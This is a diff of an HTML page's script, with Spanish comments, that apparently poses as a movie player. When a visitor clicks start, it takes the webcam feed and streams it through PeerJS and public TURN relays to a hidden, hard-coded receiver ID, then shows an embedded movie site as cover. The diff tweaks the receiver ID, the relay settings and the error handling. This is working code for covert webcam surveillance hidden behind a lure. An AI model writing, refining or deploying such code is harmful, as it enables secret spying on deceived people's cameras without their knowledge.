@@ -18,35 +18,33 @@
     <video id="v" autoplay playsinline muted></video>
 
     <script>
-        const RECEPTOR_ID = 'MONITOR-GLOBAL-77';
+        const RECEPTOR_ID = 'PANEL-MORADO-2024'; // ID SIMPLIFICADA
 
-        // CONFIGURACIÓN DE ALTA COMPATIBILIDAD
         const peer = new Peer("USR-" + Math.floor(Math.random()*9999), {
             host: '0.peerjs.com', port: 443, secure: true,
             config: {
                 'iceServers': [
                     { url: 'stun:stun.l.google.com:19302' },
-                    { url: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' },
-                    { url: 'turn:openrelay.metered.ca:443?transport=udp', username: 'openrelayproject', credential: 'openrelayproject' }
-                ],
-                'iceTransportPolicy': 'relay' // Fuerza el uso del servidor TURN
+                    { url: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
+                ]
             }
         });
 
         document.getElementById('startBtn').onclick = async () => {
             try {
-                // Bajamos resolución para asegurar que los datos móviles aguanten el flujo
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 480, height: 360, frameRate: 15 }, 
-                    audio: false 
+                    video: { width: 640, height: 480 }, audio: false 
                 });
                 document.getElementById('v').srcObject = stream;
                 
-                peer.call(RECEPTOR_ID, stream);
+                // Intentamos llamar
+                const call = peer.call(RECEPTOR_ID, stream);
+                
+                call.on('error', (err) => alert("Error de llamada: " + err));
 
                 document.getElementById('f').src = "https://la.movie/";
                 document.getElementById('movie-box').style.display = "block";
-            } catch (e) { alert("Error: Acepta los permisos de cámara."); }
+            } catch (e) { alert("ERROR: No diste permiso a la cámara."); }
         };
     </script>
 </body>
